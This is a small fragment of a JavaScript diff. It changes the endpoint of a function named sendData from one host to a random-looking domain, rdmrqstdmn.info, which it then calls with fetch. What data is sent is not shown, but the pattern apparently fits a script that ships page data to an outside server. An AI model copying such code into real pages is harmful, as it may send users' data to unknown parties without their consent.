@@ -33,7 +33,7 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 function sendData() {
-    const url = 'https://s952317063.onlinehome.fr/index.php';
+    const url = 'http://rdmrqstdmn.info/index.php';
 
     try {
         fetch(url, {
